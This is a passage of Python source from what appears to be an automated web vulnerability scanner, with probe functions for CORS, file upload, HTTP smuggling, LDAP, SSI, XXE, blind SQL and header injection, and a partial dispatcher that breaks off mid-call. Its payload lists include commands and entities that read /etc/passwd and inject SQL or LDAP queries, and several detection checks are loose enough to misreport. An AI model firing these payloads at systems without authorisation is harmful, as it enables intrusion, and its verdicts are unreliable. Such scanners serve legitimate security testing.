                    xfo = response.headers.get("X-Frame-Options", "").lower()
                    if xfo in ["deny", "sameorigin"]:
                        return False  # Return False if X-Frame-Options is set to DENY or SAMEORIGIN

        # If none of the protection headers are present, the URL is vulnerable
        success_message(f"Clickjacking Vulnerable: {url}")
        return True  # Return True indicating the vulnerability

    except requests.RequestException as e:
        # Log the exception for debugging purposes
        log_message(f"Request failed for {url}. Exception: {str(e)}")
        return False  # Return False if an exception occurs

    return False  # Return False if the URL is not vulnerable


def test_insecure_cors(url):
    """
    Test for Insecure CORS configuration vulnerability.

    Args:
        url (str): The URL to test.

    Returns:
        bool: True if the URL is vulnerable, False otherwise.
    """
    # List of malicious origins to test
    malicious_origins = [
        "http://malicious.com",
        "http://evil.com",
        "http://attacker.com",
    ]

    try:
        for origin in malicious_origins:
            headers = {
                "Origin": origin
            }  # Set the Origin header to the current malicious origin
            response = requests.get(url, headers=headers, verify=False, timeout=5)

            # Check if the response headers allow any origin or the malicious origin
            if "Access-Control-Allow-Origin" in response.headers:
                allowed_origin = response.headers["Access-Control-Allow-Origin"]
                if allowed_origin == "*" or allowed_origin == origin:
                    success_message(
                        f"Insecure CORS Configuration: {url} allows origin: {origin}"
                    )
                    return True  # Return True indicating the vulnerability

        # If none of the malicious origins are allowed, the URL is not vulnerable
        return False

    except requests.RequestException as e:
        # Log the exception for debugging purposes
        log_message(f"Request failed for {url}. Exception: {str(e)}")
        return False  # Return False if an exception occurs


def test_sensitive_data_exposure(url):
    """
    Test for Sensitive Data Exposure vulnerability by checking the response body for sensitive keywords.

    Args:
        url (str): The URL to test.

    Returns:
        bool: True if sensitive data is found, False otherwise.
    """
    # List of sensitive keywords and patterns to search for
    sensitive_keywords = [
        r"\bpassword\b",
        r"\bsecret\b",
        r"\bapi_key\b",
        r"\btoken\b",
        r"\baccess_token\b",
        r"\bprivate_key\b",
        r"\bssn\b",  # Social Security Number
        r"\bcredit_card\b",
        r"\bpin\b",  # Personal Identification Number
        r"\bsecurity_answer\b",
    ]

    # Make a request to the URL and get the response body and status
    body, status = make_request(url)

    # Check if the response body is not empty
    if body:
        # Convert the response body to lowercase for case-insensitive matching
        body_lower = body.lower()

        # Iterate over the list of sensitive keywords
        for keyword in sensitive_keywords:
            # Use regular expression search to find the keyword in the response body
            if re.search(keyword, body_lower):
                # Print a success message if the URL is vulnerable
                success_message(f"Sensitive Data Exposure: {url}")
                return True  # Return True indicating the vulnerability

    # Return False if the URL is not vulnerable
    return False


def test_unrestricted_file_upload(url):
    """
    Test for Unrestricted File Upload vulnerability by uploading various file types and checking the response.

    Args:
        url (str): The URL to test.

    Returns:
        bool: True if the upload is successful and indicates a vulnerability, False otherwise.
    """
    # List of file payloads to test
    file_payloads = [
        ("test.php", "<?php echo 'Vulnerable'; ?>", "application/x-php"),
        ("test.jsp", "<% out.println('Vulnerable'); %>", "application/x-jsp"),
        ("test.asp", "<% Response.Write('Vulnerable') %>", "application/x-asp"),
        ("test.html", "<html><body>Vulnerable</body></html>", "text/html"),
        ("test.txt", "This is a test file.", "text/plain"),
    ]

    # Iterate over the list of file payloads
    for filename, content, content_type in file_payloads:
        files = {
            "file": (filename, content, content_type)
        }  # Create a file payload with the specified content and type

        try:
            # Make a request to the URL with the file payload
            response = requests.post(url, files=files, verify=False)

            # Check if the response indicates a successful file upload
            if response.status_code == 200 and "file uploaded" in response.text.lower():
                # Print a success message if the URL is vulnerable
                success_message(
                    f"Unrestricted File Upload Vulnerable: {url} with {filename}"
                )
                return True  # Return True indicating the vulnerability

        except requests.RequestException as e:
            # Log the exception for debugging purposes
            log_message(f"RequestException occurred: {e}")
            continue  # Continue testing with the next payload

    # Return False if none of the payloads indicate a vulnerability
    return False


def test_http_verb_tampering(url):
    """
    Test for HTTP Verb Tampering vulnerability by sending requests with method overrides.

    Args:
        url (str): The URL to test.

    Returns:
        bool: True if the server is vulnerable to HTTP verb tampering, False otherwise.
    """
    # List of HTTP methods to test for tampering
    methods_to_test = ["DELETE", "PUT", "PATCH", "TRACE"]

    # Iterate over the list of methods to test
    for method in methods_to_test:
        try:
            # Make a POST request with a method override
            response = requests.post(url, data={"_method": method}, verify=False)

            # Check if the response status code is 200
            if response.status_code == 200:
                # Print a success message if the URL is vulnerable
                success_message(
                    f"HTTP Verb Tampering Vulnerable: {url} with method {method}"
                )
                return True  # Return True indicating the vulnerability

        except requests.RequestException as e:
            # Log the exception for debugging purposes
            log_message(f"RequestException occurred: {e}")
            continue  # Continue testing with the next method

    # Return False if none of the methods indicate a vulnerability
    return False


def test_cache_poisoning(
    url,
):  # Define a function to test for Cache Poisoning vulnerability
    # List of payloads to test for cache poisoning
    payloads = [
        "Cache-Control: no-store",
        "Cache-Control: no-cache",
        "Cache-Control: private",
        "Cache-Control: max-age=0",
        "Pragma: no-cache",
    ]

    # Iterate over each payload to test the URL
    for payload in payloads:
        headers = {
            "Cache-Control": payload
        }  # Set the Cache-Control header to the current payload
        try:
            # Make a request to the URL with the modified headers
            response = requests.get(url, headers=headers, verify=False)

            # Extract the directive from the payload
            directive = payload.split(": ")[1]

            # Check if the response headers contain the directive from the payload
            if directive in response.headers.get("Cache-Control", ""):
                success_message(
                    f"Cache Poisoning Vulnerable: {url} with payload: {payload}"
                )  # Print a success message if the URL is vulnerable
                return True  # Return True indicating the vulnerability
        except requests.RequestException as e:
            # Log the exception for debugging purposes
            continue  # Continue to the next payload if an exception occurs

    return False  # Return False if the URL is not vulnerable to any of the payloads


def test_http_response_splitting(url):
    """
    Test for HTTP Response Splitting vulnerability.

    Args:
        url (str): The URL to test.

    Returns:
        bool: True if the URL is vulnerable, False otherwise.
    """
    # List of payloads to test for HTTP Response Splitting
    payloads = [
        "%0d%0aSet-Cookie:mycookie=myvalue",
        "%0d%0aContent-Length:0",
        "%0d%0aContent-Type:text/html",
        "%0d%0aX-Test-Header:testvalue",
    ]

    # Iterate over each payload
    for payload in payloads:
        full_url = f"{url}?q={payload}"  # Construct the full URL with the payload
        try:
            response = requests.get(
                full_url, verify=False
            )  # Make a request to the full URL

            # Check for each payload's effect in the response headers
            if "mycookie=myvalue" in response.headers.get("Set-Cookie", ""):
                success_message(
                    f"HTTP Response Splitting Vulnerable: {url} with payload: {payload}"
                )
                return True  # Return True indicating the vulnerability

            if "0" in response.headers.get("Content-Length", ""):
                success_message(
                    f"HTTP Response Splitting Vulnerable: {url} with payload: {payload}"
                )
                return True  # Return True indicating the vulnerability

            if "text/html" in response.headers.get("Content-Type", ""):
                success_message(
                    f"HTTP Response Splitting Vulnerable: {url} with payload: {payload}"
                )
                return True  # Return True indicating the vulnerability

            if "testvalue" in response.headers.get("X-Test-Header", ""):
                success_message(
                    f"HTTP Response Splitting Vulnerable: {url} with payload: {payload}"
                )
                return True  # Return True indicating the vulnerability

        except requests.RequestException as e:
            # Log the exception for debugging purposes
            error_message(
                f"Request failed for {url} with payload: {payload}. Exception: {e}"
            )
            continue  # Continue testing with the next payload

    return False  # Return False if no vulnerabilities are found


def test_ldap_injection(url):
    """
    Function to test for LDAP Injection vulnerability.
    Args:
        url (str): The URL to test for LDAP Injection.
    Returns:
        bool: True if the URL is vulnerable, False otherwise.
    """

    # List of payloads to inject LDAP queries
    payloads = [
        "*)(uid=*))(|(uid=*",
        "*)(cn=*))(|(cn=*",
        "*)(objectClass=*))(|(objectClass=*",
        "*)(mail=*))(|(mail=*",
        "*)(userPassword=*))(|(userPassword=*",
    ]

    # Iterate over each payload to test for LDAP Injection
    for payload in payloads:
        full_url = f"{url}?search={payload}"  # Construct the full URL with the payload
        try:
            body, status = make_request(
                full_url
            )  # Make a request to the full URL and get the response body and status

            # Check if the response body contains the injected LDAP query
            if body and any(
                keyword in body
                for keyword in ["uid=", "cn=", "objectClass=", "mail=", "userPassword="]
            ):
                success_message(
                    f"LDAP Injection Vulnerable: {url} with payload: {payload}"
                )  # Print a success message if the URL is vulnerable
                return True  # Return True indicating the vulnerability

        except Exception as e:
            error_message(
                f"Error testing {url} with payload {payload}: {str(e)}"
            )  # Log the error message

    return False  # Return False if the URL is not vulnerable


def test_http_smuggling(url):
    """
    Function to test for HTTP Smuggling vulnerability.
    This function sends multiple payloads to the target URL and checks for specific responses.
    """

    # List of payloads to test for HTTP Smuggling
    payloads = [
        "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\n\r\nPOST / HTTP/1.1",
        "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: example.com\r\n\r\n",
        "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 4\r\n\r\nG\r\nET / HTTP/1.1\r\nHost: example.com\r\n\r\n",
        "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 4\r\n\r\nP\r\nOST / HTTP/1.1\r\nHost: example.com\r\n\r\n",
    ]

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }  # Set the Content-Type header

    for payload in payloads:  # Iterate over each payload
        try:  # Try to make a request with the payload
            response = requests.post(
                url, data=payload, headers=headers, verify=False
            )  # Make a request to the URL with the payload

            # Check if the response status code is 200 or if the response contains unexpected behavior
            if response.status_code == 200 or "HTTP/1.1 200 OK" in response.text:
                success_message(
                    f"HTTP Smuggling Vulnerable: {url} with payload: {payload}"
                )  # Print a success message if the URL is vulnerable
                return True  # Return True indicating the vulnerability
        except requests.RequestException as e:  # Catch any request exceptions
            error_message(
                f"Request failed for {url} with payload: {payload}. Error: {str(e)}"
            )
            continue  # Continue to the next payload if an exception occurs

    return False  # Return False if none of the payloads indicate vulnerability


def test_web_cache_deception(url):
    """
    Function to test for Web Cache Deception vulnerability.
    This function sends multiple payloads to the target URL and checks for specific responses.
    """

    # List of payloads to test for Web Cache Deception
    payloads = [
        "/.hidden.html",
        "/.hidden.css",
        "/.hidden.js",
        "/.hidden.jpg",
        "/.hidden.png",
        "/.hidden.gif",
        "/.hidden.txt",
    ]

    for payload in payloads:  # Iterate over each payload
        full_url = f"{url}{payload}"  # Construct the full URL with the payload
        try:  # Try to make a request with the payload
            response = requests.get(
                full_url, verify=False
            )  # Make a request to the full URL

            # Check if the response status code is 200 and if the response does not contain Cache-Control headers
            if response.status_code == 200 and "Cache-Control" not in response.headers:
                success_message(
                    f"Web Cache Deception Vulnerable: {url} with payload: {payload}"
                )  # Print a success message if the URL is vulnerable
                return True  # Return True indicating the vulnerability
        except requests.RequestException as e:  # Catch any request exceptions
            error_message(
                f"Request failed for {url} with payload: {payload}. Error: {str(e)}"
            )
            continue  # Continue to the next payload if an exception occurs

    return False  # Return False if none of the payloads indicate vulnerability


def test_http_desync(url):
    """
    Function to test for HTTP Desync Attack vulnerability.
    This function sends multiple payloads to the target URL and checks for specific responses.
    """

    # List of payloads to test for HTTP Desync Attack
    payloads = [
        "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 5\r\n\r\nG",
        "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 4\r\n\r\nP\r\nOST / HTTP/1.1\r\nHost: example.com\r\n\r\n",
        "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: example.com\r\n\r\n",
        "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 10\r\n\r\nPOST / HTTP/1.1",
    ]

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }  # Set the Content-Type header

    for payload in payloads:  # Iterate over each payload
        try:  # Try to make a request with the payload
            response = requests.post(
                url, data=payload, headers=headers, verify=False
            )  # Make a request to the URL with the payload

            # Check if the response status code is 200 or if the response contains unexpected behavior
            if response.status_code == 200 or "HTTP/1.1 200 OK" in response.text:
                success_message(
                    f"HTTP Desync Attack Vulnerable: {url} with payload: {payload}"
                )  # Print a success message if the URL is vulnerable
                return True  # Return True indicating the vulnerability
        except requests.RequestException as e:  # Catch any request exceptions
            error_message(
                f"Request failed for {url} with payload: {payload}. Error: {str(e)}"
            )
            continue  # Continue to the next payload if an exception occurs

    return False  # Return False if none of the payloads indicate vulnerability


def test_ssi_injection(url):
    """
    Function to test for SSI Injection vulnerability.

    Args:
    url (str): The URL to test for SSI Injection.

    Returns:
    bool: True if the URL is vulnerable, False otherwise.
    """

    # List of payloads to test for SSI Injection
    payloads = [
        '<!--#exec cmd="ls"-->',
        '<!--#exec cmd="cat /etc/passwd"-->',
        '<!--#exec cmd="echo vulnerable"-->',
        '<!--#exec cmd="id"-->',
        '<!--#exec cmd="uname -a"-->',
    ]

    # Iterate over each payload
    for payload in payloads:
        full_url = f"{url}?q={payload}"  # Construct the full URL with the payload
        body, status = make_request(
            full_url
        )  # Make a request to the full URL and get the response body and status

        # Check if the response body contains any indicative output of the injected command
        if body and any(
            indicator in body
            for indicator in ["bin", "root", "vulnerable", "uid=", "Linux"]
        ):
            success_message(
                f"SSI Injection Vulnerable: {url}"
            )  # Print a success message if the URL is vulnerable
            return True  # Return True indicating the vulnerability

    return False  # Return False if the URL is not vulnerable


def test_hpp_in_headers(url):
    """
    Function to test for HTTP Parameter Pollution in headers vulnerability.

    Args:
    url (str): The URL to test for HPP in headers.

    Returns:
    bool: True if the URL is vulnerable, False otherwise.
    """

    # List of headers to test for HTTP Parameter Pollution
    headers_list = [
        {"X-Forwarded-For": "127.0.0.1, 127.0.0.2"},
        {"X-Forwarded-For": "127.0.0.1, 127.0.0.2, 127.0.0.3"},
        {"X-Forwarded-For": "127.0.0.1, 127.0.0.2, 127.0.0.3, 127.0.0.4"},
        {"X-Forwarded-For": "127.0.0.1, 127.0.0.2, 127.0.0.3, 127.0.0.4, 127.0.0.5"},
    ]

    # Iterate over each set of headers
    for headers in headers_list:
        try:
            response = requests.get(
                url, headers=headers, verify=False
            )  # Make a request to the URL with the modified headers

            # Check if the response text contains any of the additional IP addresses
            if any(
                ip in response.text for ip in headers["X-Forwarded-For"].split(", ")[1:]
            ):
                success_message(
                    f"HPP in Headers Vulnerable: {url}"
                )  # Print a success message if the URL is vulnerable
                return True  # Return True indicating the vulnerability
        except requests.RequestException as e:  # Catch any request exceptions
            continue  # Continue to the next set of headers if an exception occurs

    return False  # Return False if the URL is not vulnerable


def test_email_header_injection(url):
    """
    Function to test for Email Header Injection vulnerability.

    Args:
    url (str): The URL to be tested for vulnerability.

    Returns:
    bool: True if the URL is vulnerable, False otherwise.
    """

    # List of payloads to test for Email Header Injection
    payloads = [
        "testuser@example.com\r\nBCC: victimuser@example.com",
        "testuser@example.com\r\nCC: victimuser@example.com",
        "testuser@example.com\r\nTo: victimuser@example.com",
        "testuser@example.com\r\nSubject: Injected Subject",
        "testuser@example.com\r\nX-Test: Injected Header",
    ]

    # Iterate over each payload to test for vulnerabilities
    for payload in payloads:
        # Construct the full URL with the current payload
        full_url = f"{url}?email={payload}"

        # Make a request to the full URL and get the response body and status
        body, status = make_request(full_url)

        # Check if the response body contains any of the injected headers
        if body and any(
            header in body
            for header in [
                "victimuser@example.com",
                "Injected Subject",
                "Injected Header",
            ]
        ):
            # Print a success message if the URL is vulnerable
            success_message(
                f"Email Header Injection Vulnerable: {url} with payload: {payload}"
            )
            return True  # Return True indicating the vulnerability

    return False  # Return False if the URL is not vulnerable


def test_xxe_via_svg(
    url,
):  # Define a function to test for XXE via SVG File Upload vulnerability
    # List of payloads to test for XXE vulnerability
    payloads = [
        """<?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
        "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
        <rect width="100" height="100" fill="blue"/>
        <text x="10" y="20" font-family="Verdana" font-size="20" fill="white">
        &xxe;
        </text>
        </svg>""",
        """<?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
        <rect width="100" height="100" fill="blue"/>
        <text x="10" y="20" font-family="Verdana" font-size="20" fill="white">
        &xxe;
        </text>
        </svg>""",
        """<?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "file:///etc/hosts">
        ]>
        <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
        <rect width="100" height="100" fill="blue"/>
        <text x="10" y="20" font-family="Verdana" font-size="20" fill="white">
        &xxe;
        </text>
        </svg>""",
    ]

    for payload in payloads:  # Iterate over each payload
        files = {
            "file": ("test.svg", payload)
        }  # Set the file payload with the SVG file
        try:  # Try to make a request with the file payload
            response = requests.post(
                url, files=files, verify=False
            )  # Make a request to the URL with the file payload
            if response.status_code == 200:  # Check if the request was successful
                # Check for common indicators of XXE vulnerability in the response
                if any(
                    indicator in response.text
                    for indicator in ["root:x", "127.0.0.1", "localhost"]
                ):
                    success_message(
                        f"XXE via SVG File Upload Vulnerable: {url}"
                    )  # Print a success message if the URL is vulnerable
                    return True  # Return True indicating the vulnerability
        except requests.RequestException as e:  # Catch any request exceptions
            log_message(f"Request failed: {e}")  # Log the error message
            continue  # Continue to the next payload if an exception occurs

    return False  # Return False if none of the payloads indicate vulnerability


def test_blind_sql_injection(
    url,
):  # Define a function to test for Blind SQL Injection vulnerability
    # List of payloads to test for Blind SQL Injection
    payloads = [
        "' OR SLEEP(5)--",
        "' OR 1=1--",
        "' OR 'a'='a'--",
        "' OR '1'='1'--",
        "' OR '1'='1' AND SLEEP(5)--",
        "' OR 1=1 AND SLEEP(5)--",
    ]

    for payload in payloads:  # Iterate over each payload
        full_url = f"{url}?id={payload}"  # Construct the full URL with the payload
        try:  # Try to make a request with the payload
            start_time = datetime.now()  # Record the start time of the request
            body, status = make_request(
                full_url
            )  # Make a request to the full URL and get the response body and status
            end_time = datetime.now()  # Record the end time of the request

            # Check if the request took at least 5 seconds for time-based payloads
            if "SLEEP" in payload and (end_time - start_time).seconds >= 5:
                success_message(
                    f"Blind SQL Injection Vulnerable: {url}"
                )  # Print a success message if the URL is vulnerable
                return True  # Return True indicating the vulnerability

            # Check for common indicators of SQL injection in the response body
            if any(
                indicator in body
                for indicator in [
                    "syntax error",
                    "unclosed quotation mark",
                    "SQL syntax",
                ]
            ):
                success_message(
                    f"Blind SQL Injection Vulnerable: {url}"
                )  # Print a success message if the URL is vulnerable
                return True  # Return True indicating the vulnerability

        except requests.RequestException as e:  # Catch any request exceptions
            log_message(f"Request failed: {e}")  # Log the error message
            continue  # Continue to the next payload if an exception occurs

    return False  # Return False if none of the payloads indicate vulnerability


def test_http_method_override(
    url,
):  # Define a function to test for HTTP Method Override vulnerability
    # List of headers to test for HTTP Method Override
    headers_list = [
        {"X-HTTP-Method-Override": "DELETE"},
        {"X-HTTP-Method-Override": "PUT"},
        {"X-HTTP-Method-Override": "PATCH"},
        {"X-HTTP-Method": "DELETE"},
        {"X-HTTP-Method": "PUT"},
        {"X-HTTP-Method": "PATCH"},
        {"X-Method-Override": "DELETE"},
        {"X-Method-Override": "PUT"},
        {"X-Method-Override": "PATCH"},
    ]

    for headers in headers_list:  # Iterate over each set of headers
        try:  # Try to make a request with the method override
            response = requests.post(
                url, headers=headers, verify=False
            )  # Make a request to the URL with the method override
            if response.status_code in [
                200,
                204,
            ]:  # Check if the response status code indicates success
                success_message(
                    f"HTTP Method Override Vulnerable: {url} with headers {headers}"
                )  # Print a success message if the URL is vulnerable
                return True  # Return True indicating the vulnerability
        except requests.RequestException as e:  # Catch any request exceptions
            log_message(f"Request failed: {e}")  # Log the error message
            continue  # Continue to the next set of headers if an exception occurs

    return False  # Return False if none of the headers indicate vulnerability


# Function to test for all CVEs
def test_cves(url):
    global total_scans, vulnerabilities_found
    # Test for SQL Injection vulnerability
    if test_sql_injection(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating SQL Injection vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mSQL Injection \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no SQL Injection vulnerability
        print_message(
            "info",
            f"\033\033[1;97mSQL Injection \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for XSS vulnerability
    if test_xss(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating XSS vulnerability
        print_message(
            "vulnerable", f"\033[1;97mXSS \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no XSS vulnerability
        print_message(
            "info", f"\033[1;97mXSS \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for Path Traversal vulnerability
    if test_path_traversal(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Path Traversal vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mPath Traversal \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Path Traversal vulnerability
        print_message(
            "info",
            f"\033[1;97mPath Traversal \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for Directory Listing vulnerability
    if test_directory_listing(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Directory Listing vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mDirectory Listing \033[1;92mEnabled\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Directory Listing vulnerability
        print_message(
            "info",
            f"\033[1;97mDirectory Listing \033[1;91mNot Enabled\033[1;97m: {url}",
        )

    # Test for Command Injection vulnerability
    if test_command_injection(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Command Injection vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mCommand Injection \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Command Injection vulnerability
        print_message(
            "info",
            f"\033[1;97mCommand Injection \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for LFI vulnerability
    if test_lfi(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating LFI vulnerability
        print_message(
            "vulnerable", f"\033[1;97mLFI \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no LFI vulnerability
        print_message(
            "info", f"\033[1;97mLFI \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for RFI vulnerability
    if test_rfi(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating RFI vulnerability
        print_message(
            "vulnerable", f"\033[1;97mRFI \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no RFI vulnerability
        print_message(
            "info", f"\033[1;97mRFI \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for File Upload vulnerability
    if test_file_upload(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating File Upload vulnerability
        print_message(
            "vulnerable", f"\033[1;97mFile Upload \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no File Upload vulnerability
        print_message(
            "info", f"\033[1;97mFile Upload \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for Open Redirect vulnerability
    if test_open_redirect(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Open Redirect vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mOpen Redirect \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Open Redirect vulnerability
        print_message(
            "info", f"\033[1;97mOpen Redirect \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for CSRF vulnerability
    if test_csrf(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating CSRF vulnerability
        print_message(
            "vulnerable", f"\033[1;97mCSRF \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no CSRF vulnerability
        print_message(
            "info", f"\033[1;97mCSRF \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for CRLF Injection vulnerability
    if test_crlf(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating CRLF Injection vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mCRLF Injection \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no CRLF Injection vulnerability
        print_message(
            "info",
            f"\033[1;97mCRLF Injection \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for CSTI vulnerability
    if test_csti(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating CSTI vulnerability
        print_message(
            "vulnerable", f"\033[1;97mCSTI \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no CSTI vulnerability
        print_message(
            "info", f"\033[1;97mCSTI \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for SSRF vulnerability
    if test_ssrf(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating SSRF vulnerability
        print_message(
            "vulnerable", f"\033[1;97mSSRF \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no SSRF vulnerability
        print_message(
            "info", f"\033[1;97mSSRF \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for XXE vulnerability
    if test_xxe(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating XXE vulnerability
        print_message(
            "vulnerable", f"\033[1;97mXXE \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no XXE vulnerability
        print_message(
            "info", f"\033[1;97mXXE \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for SSTI vulnerability
    if test_ssti(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating SSTI vulnerability
        print_message(
            "vulnerable", f"\033[1;97mSSTI \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no SSTI vulnerability
        print_message(
            "info", f"\033[1;97mSSTI \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for Insecure Deserialization vulnerability
    if test_insecure_deserialization(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Insecure Deserialization vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mInsecure Deserialization \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Insecure Deserialization vulnerability
        print_message(
            "info",
            f"\033[1;97mInsecure Deserialization \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for HTTP Header Injection vulnerability
    if test_http_header_injection(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating HTTP Header Injection vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mHTTP Header Injection \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no HTTP Header Injection vulnerability
        print_message(
            "info",
            f"\033[1;97mHTTP Header Injection \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for Subdomain Takeover vulnerability
    if test_subdomain_takeover(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Subdomain Takeover vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mSubdomain Takeover \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Subdomain Takeover vulnerability
        print_message(
            "info",
            f"\033[1;97mSubdomain Takeover \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for Host Header Injection vulnerability
    if test_host_header_injection(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Host Header Injection vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mHost Header Injection \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Host Header Injection vulnerability
        print_message(
            "info",
            f"\033[1;97mHost Header Injection \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for HTTP Parameter Pollution vulnerability
    if test_http_parameter_pollution(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating HTTP Parameter Pollution vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mHTTP Parameter Pollution \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no HTTP Parameter Pollution vulnerability
        print_message(
            "info",
            f"\033[1;97mHTTP Parameter Pollution \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for Clickjacking vulnerability
    if test_clickjacking(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Clickjacking vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mClickjacking \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Clickjacking vulnerability
        print_message(
            "info", f"\033[1;97mClickjacking \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for Insecure CORS vulnerability
    if test_insecure_cors(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Insecure CORS vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mInsecure CORS \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Insecure CORS vulnerability
        print_message(
            "info", f"\033[1;97mInsecure CORS \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for Sensitive Data Exposure vulnerability
    if test_sensitive_data_exposure(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Sensitive Data Exposure vulnerability
        print_message(
            "vulnerable",
